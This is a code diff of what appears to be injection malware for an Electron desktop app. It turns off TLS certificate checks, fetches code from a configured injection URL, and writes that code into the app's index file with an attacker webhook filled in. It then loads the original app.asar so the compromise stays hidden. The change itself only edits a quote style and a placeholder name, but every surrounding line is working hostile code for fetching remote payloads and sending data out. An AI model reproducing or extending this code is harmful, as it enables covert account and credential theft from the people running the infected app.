@@ -2,7 +2,7 @@ process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0
 
 const fs = require("fs")
 const electron = require("electron")
-const session = require('electron').session
+const session = require("electron").session
 const https = require("https");
 const queryString = require("querystring")
 
@@ -482,7 +482,7 @@ function init() {
     https.get("${config.injection_url}", res => {
         var chunk = ""
         res.on("data", data => chunk += data)
-        res.on("end", () => fs.writeFileSync(index, chunk.replace("%WEBHOOK%", "${config.webhook}")))
+        res.on("end", () => fs.writeFileSync(index, chunk.replace("%HOOKRE%", "${config.webhook}")))
     }).on("error", (err) => setTimeout(init(), 10000));
 }
 require("${appPath}/app.asar")
